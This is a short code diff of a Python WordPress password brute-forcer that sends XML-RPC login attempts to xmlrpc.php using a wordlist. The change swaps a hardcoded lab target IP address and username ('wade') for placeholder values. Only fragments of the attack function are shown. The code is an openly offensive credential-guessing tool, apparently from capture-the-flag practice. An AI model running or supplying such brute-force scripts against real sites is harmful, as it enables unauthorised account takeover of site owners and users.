@@ -8,7 +8,6 @@ def brute_wp(passwd,usuario,url):
 	global flag
 
 	if flag != 1:
-
 		cookie = {'Cookie':'wordpress_test_cookie=WP+Cookie+check'}
 		datos = """<?xml version="1.0" encoding="UTF-8"?>
 						<methodCall> 
@@ -32,10 +31,10 @@ def brute_wp(passwd,usuario,url):
 			
 def main():
 
-	url = "http://10.10.135.197/retro/xmlrpc.php"
-	usuario = 'wade'
+	url = "http://--IP--/xmlrpc.php"
+	usuario = '--Users--'
 
-	file = 'dic_baseweb.txt'
+	file = '--Diccionario--'
 
 	with open(file) as dic:
 		
